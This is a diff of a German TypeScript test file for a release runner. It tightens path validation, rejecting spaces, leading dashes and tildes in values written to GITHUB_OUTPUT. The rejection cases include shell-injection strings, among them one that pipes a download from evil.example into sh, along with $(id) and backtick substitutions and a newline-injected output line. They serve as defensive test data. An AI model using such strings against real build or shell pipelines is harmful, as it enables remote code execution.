@@ -77,6 +77,26 @@ function pflichtDb() {
   return db;
 }
 
+/**
+ * Ein frisches Verzeichnis unter TEMP für ein Artefakt, dessen Pfad der
+ * Ausführer weitergeben soll.
+ *
+ * Seit 2026-10-01 gibt der Ausführer keinen Archivpfad mit Leerzeichen
+ * weiter (`PFAD_MUSTER` in `scripts/release-ausfuehrer.ts`). Läge TEMP selbst
+ * unter einem solchen Pfad, scheiterte jeder gelungene Fall unten mit „hat
+ * nicht die erwartete Form", und niemand sähe sofort, warum. Unter Windows
+ * ist TEMP üblicherweise der 8.3-Kurzname (`C:\Users\JAVADQ~1\…`), im CI
+ * `/tmp` — beides ohne Leerzeichen.
+ */
+function artefaktVerzeichnis(praefix: string): string {
+  assert.doesNotMatch(
+    tmpdir(),
+    /\s/,
+    `TEMP (${tmpdir()}) enthält ein Leerzeichen — der Ausführer gibt solche Pfade absichtlich nicht weiter. TEMP für die Prüfreihe auf einen Pfad ohne Leerzeichen setzen.`,
+  );
+  return mkdtempSync(join(tmpdir(), praefix));
+}
+
 async function aufraeumen() {
   if (!db) return;
   // Auch Reste abgebrochener Läufe (andere RUN-Nummer): Ein liegengebliebener,
@@ -832,7 +852,7 @@ describe('Release-Ausführer', { concurrency: 1 }, () => {
     const d = pflichtDb();
     // Ein eigenes Artefakt: Bytes, Prüfsummendatei, Beilage (Format 2) — wie
     // `scripts/release-artefakt.ts` sie ablegt.
-    const verzeichnis = mkdtempSync(join(tmpdir(), 'clenaris-ausfuehrer-'));
+    const verzeichnis = artefaktVerzeichnis('clenaris-ausfuehrer-');
     const commit = createHash('sha1').update(`werkzeug-${RUN}`).digest('hex');
     const name = `clenaris-${commit.slice(0, 12)}`;
     const archiv = join(verzeichnis, `${name}.tar.gz`);
@@ -1086,6 +1106,10 @@ describe('Release-Ausführer: Werkzeug und Verträge ohne Server (rein)', () => 
     assert.equal(ausgabeZeile('modus', 'neu'), 'modus=neu');
     assert.equal(ausgabeZeile('auftrag', ''), 'auftrag=');
     assert.equal(ausgabeZeile('archiv', 'C:\\Temp\\release\\clenaris-0123456789ab.tar.gz'), 'archiv=C:\\Temp\\release\\clenaris-0123456789ab.tar.gz');
+    // Was der Workflow wirklich schreibt (relatives `--verzeichnis release`),
+    // und ein Windows-TEMP mit 8.3-Kurznamen: Tilde in der Mitte ist erlaubt.
+    assert.equal(ausgabeZeile('archiv', 'release/clenaris-0123456789ab.tar.gz'), 'archiv=release/clenaris-0123456789ab.tar.gz');
+    assert.ok(ausgabeZeile('archiv', 'C:\\Users\\JAVADQ~1\\AppData\\Local\\Temp\\clenaris-0123456789ab.tar.gz'));
     assert.equal(ausgabeZeile('ergebnis', 'ROLLED_BACK'), 'ergebnis=ROLLED_BACK');
     for (const [name, wert] of [
       ['archiv', '/tmp/a.tar.gz\narchiv=/tmp/fremd.tar.gz'],
@@ -1099,6 +1123,13 @@ describe('Release-Ausführer: Werkzeug und Verträge ohne Server (rein)', () => 
       ['archiv', "/tmp/a'; curl https://evil.example | sh; '"],
       ['archiv', '/tmp/$(id).tar.gz'],
       ['archiv', '/tmp/`id`.tar.gz'],
+      // Seit 2026-10-01: ein Leerzeichen trennte ohne Anführungszeichen zwei
+      // Wörter; ein führendes `-` läsen scp und tar als Option, ein führendes
+      // `~` ersetzte die Shell durch das Heimatverzeichnis.
+      ['archiv', '/tmp/mit leerzeichen/clenaris-0123456789ab.tar.gz'],
+      ['archiv', 'C:\\Users\\Javad Qasemi\\AppData\\Local\\Temp\\clenaris-0123456789ab.tar.gz'],
+      ['archiv', '-v.tar.gz'],
+      ['archiv', '~/release/clenaris-0123456789ab.tar.gz'],
       ['commit', 'abc'],
       ['modus', 'vielleicht'],
       ['ergebnis', 'ERFOLG'],
@@ -1179,7 +1210,7 @@ describe('Release-Ausführer: Werkzeug und Verträge ohne Server (rein)', () => 
   });
 
   it('abholen misst Archiv, Prüfsummendatei und Beilage gegen Auftrag und CI-Lauf', async () => {
-    const dir = mkdtempSync(join(tmpdir(), 'clenaris-messen-'));
+    const dir = artefaktVerzeichnis('clenaris-messen-');
     try {
       const commit = createHash('sha1').update('messen-rein').digest('hex');
       const name = `clenaris-${commit.slice(0, 12)}`;
@@ -1244,8 +1275,14 @@ describe('Release-Ausführer: Werkzeug und Verträge ohne Server (rein)', () => 
    * Der gelungene Lauf vorneweg ist die Gegenprobe: Er zeigt, dass die
    * Attrappe eine Übernahme überhaupt sieht. Ohne ihn wäre „keine Übernahme"
    * auch dann grün, wenn die Attrappe nie gefragt würde.
+   *
+   * Seit 2026-10-01 gehört das Leerzeichen im Pfad dazu (Gegenprüfung
+   * 2026-09-30): Bis dahin liess das Muster es zu, obwohl der Kommentar
+   * versprach, der Pfad passe wörtlich in eine Shell-Zeile. Gegen jenen Stand
+   * scheitert der dritte Fall — Ausgang 0, eine Übernahme, eine Zeile in
+   * GITHUB_OUTPUT.
    */
-  it('abholen prüft die Ausgaben vor der Übernahme: eine Klammer im Pfad oder fremde Zeichen in der Build-ID übernehmen nichts und schreiben nichts', async () => {
+  it('abholen prüft die Ausgaben vor der Übernahme: eine Klammer im Pfad oder fremde Zeichen in der Build-ID übernehmen nichts und schreiben nichts — ebenso ein Leerzeichen im Pfad', async () => {
     const commit = createHash('sha1').update('abholen-reihenfolge').digest('hex');
     const name = `clenaris-${commit.slice(0, 12)}`;
     const bytes = Buffer.from('Prüfarchiv, Reihenfolge');
@@ -1275,7 +1312,7 @@ describe('Release-Ausführer: Werkzeug und Verträge ohne Server (rein)', () => 
 
     const verzeichnisse: string[] = [];
     const artefakt = (praefix: string, beilage: Partial<ArtefaktBeilage> = {}) => {
-      const dir = mkdtempSync(join(tmpdir(), praefix));
+      const dir = artefaktVerzeichnis(praefix);
       verzeichnisse.push(dir);
       writeFileSync(join(dir, `${name}.tar.gz`), bytes);
       writeFileSync(join(dir, `${name}.tar.gz.sha256`), `${summe}  ${name}.tar.gz\n`);
@@ -1308,6 +1345,7 @@ describe('Release-Ausführer: Werkzeug und Verträge ohne Server (rein)', () => 
       const faelle: [string, string, RegExp][] = [
         ['Klammer im Pfad', artefakt('clenaris-reihenfolge-(klammer)-'), /Ausgabe „archiv"/],
         ['Build-ID mit Leerzeichen und $', artefakt('clenaris-reihenfolge-', { buildId: 'bau $(id)' }), /Ausgabe „buildid"/],
+        ['Leerzeichen im Pfad', artefakt('clenaris-reihenfolge mit leerzeichen-'), /Ausgabe „archiv"/],
       ];
       for (const [fall, dir, grund] of faelle) {
         const r = await abholen(dir);
